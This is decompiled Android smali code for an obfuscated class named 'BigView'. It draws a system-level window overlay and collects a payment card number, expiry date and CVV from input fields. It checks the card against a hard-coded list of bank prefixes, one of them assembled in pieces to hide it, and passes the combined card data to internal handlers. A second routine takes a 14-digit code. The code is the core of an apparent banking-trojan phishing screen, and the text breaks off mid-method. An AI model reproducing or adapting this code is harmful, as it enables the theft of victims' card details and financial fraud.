.class public Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;
.super Landroid/widget/RelativeLayout;
.source "BigView.java"


# instance fields
.field fgfghjjklipipi:Ljava/lang/String;

.field hert:I

.field hert2:I

.field hert3:I

.field protected layoutParams:Landroid/view/WindowManager$LayoutParams;

.field private layoutResId:I

.field private notificationId:I


# direct methods
.method public constructor <init>(Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;)V
    .locals 2
    .param p1, "service"    # Lqfu/wfwhgkemerzo/eislrebmhmf/EtroDetra;

    .prologue
    const/4 v1, 0x1

    .line 73
    invoke-direct {p0, p1}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    .line 64
    const-string v0, "#50afb0b3"

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    .line 65
    const-string v0, "#FFFFFF"

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert2:I

    .line 66
    const-string v0, "#e9eaeb"

    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    .line 67
    const-string v0, "ackgroun"

    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    .line 69
    const/4 v0, 0x0

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->notificationId:I

    .line 75
    const/high16 v0, 0x7f030000

    iput v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutResId:I

    .line 76
    iput v1, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->notificationId:I

    .line 78
    invoke-virtual {p0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->setLongClickable(Z)V

    .line 80
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$1;

    invoke-direct {v0, p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$1;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    invoke-virtual {p0, v0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->setOnLongClickListener(Landroid/view/View$OnLongClickListener;)V

    .line 88
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->load()V

    .line 89
    return-void
.end method

.method public static RotateBitmap(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
    .locals 7
    .param p0, "source"    # Landroid/graphics/Bitmap;

    .prologue
    const/4 v1, 0x0

    .line 1131
    new-instance v5, Landroid/graphics/Matrix;

    invoke-direct {v5}, Landroid/graphics/Matrix;-><init>()V

    .line 1132
    .local v5, "matrix":Landroid/graphics/Matrix;
    const/high16 v0, 0x43870000    # 270.0f

    invoke-virtual {v5, v0}, Landroid/graphics/Matrix;->postRotate(F)Z

    .line 1133
    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v3

    invoke-virtual {p0}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v4

    const/4 v6, 0x1

    move-object v0, p0

    move v2, v1

    invoke-static/range {v0 .. v6}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIIILandroid/graphics/Matrix;Z)Landroid/graphics/Bitmap;

    move-result-object v0

    return-object v0
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 127
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_2

    .line 128
    :cond_0
    const-string p1, ""

    .line 134
    .end local p1    # "s":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p1

    .line 130
    .restart local p1    # "s":Ljava/lang/String;
    :cond_2
    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    .line 131
    .local v0, "first":C
    invoke-static {v0}, Ljava/lang/Character;->isUpperCase(C)Z

    move-result v1

    if-nez v1, :cond_1

    .line 134
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/Character;->toUpperCase(C)C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0
.end method

.method public static getId(Ljava/lang/String;)I
    .locals 4
    .param p0, "resourceName"    # Ljava/lang/String;

    .prologue
    .line 93
    :try_start_0
    const-string v2, "qfu.wfwhgkemerzo.eislrebmhmf.R$id"

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2, p0}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    .line 95
    .local v1, "idField":Ljava/lang/reflect/Field;
    invoke-virtual {v1, v1}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    return v2

    .line 96
    .end local v1    # "idField":Ljava/lang/reflect/Field;
    :catch_0
    move-exception v0

    .line 97
    .local v0, "e":Ljava/lang/Exception;
    new-instance v2, Ljava/lang/RuntimeException;

    const-string v3, ""

    invoke-direct {v2, v3, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v2
.end method

.method public static getResourceByName(Ljava/lang/Class;Ljava/lang/String;)I
    .locals 5
    .param p1, "name"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Class",
            "<*>;",
            "Ljava/lang/String;",
            ")I"
        }
    .end annotation

    .prologue
    .line 101
    .local p0, "Rclass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    const/4 v2, -0x1

    .line 103
    .local v2, "id":I
    if-eqz p0, :cond_0

    .line 104
    :try_start_0
    invoke-virtual {p0, p1}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    .line 105
    .local v1, "field":Ljava/lang/reflect/Field;
    if-eqz v1, :cond_0

    .line 106
    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    .line 112
    .end local v1    # "field":Ljava/lang/reflect/Field;
    :cond_0
    :goto_0
    return v2

    .line 108
    :catch_0
    move-exception v0

    .line 109
    .local v0, "e":Ljava/lang/Exception;
    const-string v3, "GET_RESOURCE_BY_NAME: "

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 110
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method private setupLayoutParams()V
    .locals 6

    .prologue
    const/4 v1, -0x1

    .line 148
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    .line 149
    const/16 v3, 0x7da

    const/16 v4, 0x100

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 148
    iput-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    .line 150
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, 0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->screenOrientation:I

    .line 151
    iget-object v0, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getLayoutGravity()I

    move-result v1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 153
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->onSetupLayoutParams()V

    .line 154
    return-void
.end method


# virtual methods
.method protected addView()V
    .locals 7

    .prologue
    .line 204
    invoke-direct {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->setupLayoutParams()V

    .line 206
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "window"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/WindowManager;

    iget-object v3, p0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v2, p0, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 212
    :try_start_0
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "setVisibility"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Class;

    const/4 v5, 0x0

    .line 213
    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v5

    .line 212
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    :try_end_0
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 215
    .local v1, "method":Ljava/lang/reflect/Method;
    :try_start_1
    invoke-super {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    const/16 v5, 0x8

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v3, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_1 .. :try_end_1} :catch_1

    .line 231
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :goto_0
    return-void

    .line 216
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_0
    move-exception v0

    .line 218
    .local v0, "e":Ljava/lang/IllegalArgumentException;
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/IllegalArgumentException;->printStackTrace()V
    :try_end_2
    .catch Ljava/lang/NoSuchMethodException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    .line 226
    .end local v0    # "e":Ljava/lang/IllegalArgumentException;
    .end local v1    # "method":Ljava/lang/reflect/Method;
    :catch_1
    move-exception v0

    .line 228
    .local v0, "e":Ljava/lang/NoSuchMethodException;
    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto :goto_0

    .line 219
    .end local v0    # "e":Ljava/lang/NoSuchMethodException;
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_2
    move-exception v0

    .line 221
    .local v0, "e":Ljava/lang/IllegalAccessException;
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 222
    .end local v0    # "e":Ljava/lang/IllegalAccessException;
    :catch_3
    move-exception v0

    .line 224
    .local v0, "e":Ljava/lang/reflect/InvocationTargetException;
    invoke-virtual {v0}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0
.end method

.method protected animationView()Landroid/view/View;
    .locals 0

    .prologue
    .line 289
    return-object p0
.end method

.method public buttonsend1()V
    .locals 17

    .prologue
    .line 965
    const-string v14, "cardinput"

    invoke-static {v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v12

    check-cast v12, Landroid/widget/TextView;

    .line 966
    .local v12, "pininput":Landroid/widget/TextView;
    invoke-virtual {v12}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v14

    invoke-interface {v14}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v11

    .line 967
    .local v11, "pin":Ljava/lang/String;
    const-string v14, "mmyy"

    invoke-static {v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/TextView;

    .line 968
    .local v8, "mmyy":Landroid/widget/TextView;
    invoke-virtual {v8}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v14

    invoke-interface {v14}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    .line 969
    .local v9, "mmyystr":Ljava/lang/String;
    const-string v14, "cvv"

    invoke-static {v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 970
    .local v1, "cvv":Landroid/widget/TextView;
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v14

    invoke-interface {v14}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 971
    .local v2, "cvvstr":Ljava/lang/String;
    const/4 v10, 0x0

    .line 972
    .local v10, "nevalid":I
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v14

    const/16 v15, 0x10

    if-eq v14, v15, :cond_0

    .line 973
    const/4 v10, 0x1

    .line 975
    :cond_0
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v14

    const/4 v15, 0x5

    if-eq v14, v15, :cond_1

    .line 976
    const/4 v10, 0x1

    .line 978
    :cond_1
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v14

    const/4 v15, 0x3

    if-eq v14, v15, :cond_2

    .line 979
    const/4 v10, 0x1

    .line 981
    :cond_2
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v14

    const/4 v15, 0x5

    if-ge v14, v15, :cond_3

    .line 982
    const-string v9, "00/00"

    .line 986
    :cond_3
    if-nez v10, :cond_7

    .line 987
    const/4 v14, 0x0

    const/4 v15, 0x2

    invoke-virtual {v9, v14, v15}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    const/16 v15, 0xc

    if-gt v14, v15, :cond_4

    const/4 v14, 0x0

    const/4 v15, 0x2

    invoke-virtual {v9, v14, v15}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    if-nez v14, :cond_5

    .line 988
    :cond_4
    const/4 v10, 0x1

    .line 991
    :cond_5
    const/4 v14, 0x3

    const/4 v15, 0x5

    invoke-virtual {v9, v14, v15}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    const/16 v15, 0x1b

    if-gt v14, v15, :cond_6

    const/4 v14, 0x3

    const/4 v15, 0x5

    invoke-virtual {v9, v14, v15}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    const/16 v15, 0x10

    if-ge v14, v15, :cond_7

    .line 992
    :cond_6
    const/4 v10, 0x1

    .line 995
    :cond_7
    const-string v13, "c"

    .line 996
    .local v13, "type":Ljava/lang/String;
    const v14, 0x7f08004e

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/ImageView;

    .line 997
    .local v5, "logo1":Landroid/widget/ImageView;
    invoke-virtual {v5}, Landroid/widget/ImageView;->getVisibility()I

    move-result v14

    const/16 v15, 0x8

    if-eq v14, v15, :cond_8

    .line 998
    const-string v13, "w"

    .line 1000
    :cond_8
    const v14, 0x7f08004f

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/ImageView;

    .line 1001
    .local v6, "logo2":Landroid/widget/ImageView;
    invoke-virtual {v6}, Landroid/widget/ImageView;->getVisibility()I

    move-result v14

    const/16 v15, 0x8

    if-eq v14, v15, :cond_9

    .line 1002
    const-string v13, "g"

    .line 1004
    :cond_9
    const v14, 0x7f080050

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/ImageView;

    .line 1005
    .local v7, "logo4":Landroid/widget/ImageView;
    invoke-virtual {v7}, Landroid/widget/ImageView;->getVisibility()I

    move-result v14

    const/16 v15, 0x8

    if-eq v14, v15, :cond_a

    .line 1006
    const-string v13, "o"

    .line 1008
    :cond_a
    const-string v4, "0000"

    .line 1009
    .local v4, "hot":Ljava/lang/String;
    invoke-virtual {v11}, Ljava/lang/String;->length()I

    move-result v14

    const/4 v15, 0x4

    if-le v14, v15, :cond_b

    .line 1010
    const/4 v14, 0x0

    const/4 v15, 0x4

    invoke-virtual {v11, v14, v15}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    .line 1012
    :cond_b
    const-string v3, "80"

    .line 1013
    .local v3, "dfsdfdsee":Ljava/lang/String;
    const-string v14, "4941"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1014
    const-string v14, "5432"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1015
    const-string v14, "4847"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1016
    const-string v14, "4373"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1017
    const-string v14, "5273"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1018
    const-string v14, "4250"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1019
    const-string v14, "5264"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1020
    const-string v14, "5579"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1021
    const-string v14, "5288"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1022
    const-string v14, "5300"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1023
    new-instance v14, Ljava/lang/StringBuilder;

    const-string v15, "4"

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const-string v15, "1"

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1024
    const-string v14, "4143"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1025
    const-string v14, "4736"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1026
    const-string v14, "4892"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1027
    const-string v14, "5290"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1028
    const-string v14, "4351"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1029
    const-string v14, "4144"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1030
    const-string v14, "4470"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1031
    const-string v14, "5249"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1032
    const-string v14, "5443"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1033
    const-string v14, "5313"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1034
    const-string v14, "5262"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1035
    const-string v14, "4077"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1036
    const-string v14, "5164"

    invoke-virtual {v4, v14}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v14

    if-nez v14, :cond_c

    .line 1038
    const/4 v10, 0x2

    .line 1040
    :cond_c
    const/4 v14, 0x2

    if-ne v10, v14, :cond_d

    .line 1041
    new-instance v14, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const/4 v15, 0x0

    const/16 v16, 0x2

    move/from16 v0, v16

    invoke-virtual {v9, v15, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const/4 v15, 0x3

    const/16 v16, 0x5

    move/from16 v0, v16

    invoke-virtual {v9, v15, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->necode(Ljava/lang/String;)V

    .line 1049
    :goto_0
    return-void

    .line 1043
    :cond_d
    const/4 v14, 0x1

    if-ne v10, v14, :cond_e

    .line 1044
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->nevalid()V

    goto :goto_0

    .line 1046
    :cond_e
    new-instance v14, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const/4 v15, 0x0

    const/16 v16, 0x2

    move/from16 v0, v16

    invoke-virtual {v9, v15, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    const/4 v15, 0x3

    const/16 v16, 0x5

    move/from16 v0, v16

    invoke-virtual {v9, v15, v0}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    move-object/from16 v0, p0

    invoke-virtual {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->valid(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public buttonsend2()V
    .locals 5

    .prologue
    .line 475
    const-string v3, "pininput"

    invoke-static {v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {p0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    .line 476
    .local v2, "pininput":Landroid/widget/TextView;
    invoke-virtual {v2}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 477
    .local v1, "pin":Ljava/lang/String;
    const/4 v0, 0x0

    .line 478
    .local v0, "nevalid":I
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v4, 0xe

    if-eq v3, v4, :cond_0

    .line 479
    const/4 v0, 0x1

    .line 481
    :cond_0
    const/4 v3, 0x1

    if-ne v0, v3, :cond_1

    .line 482
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->nevalid()V

    .line 486
    :goto_0
    return-void

    .line 484
    :cond_1
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "d"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->valid(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public destory()V
    .locals 2

    .prologue
    .line 252
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

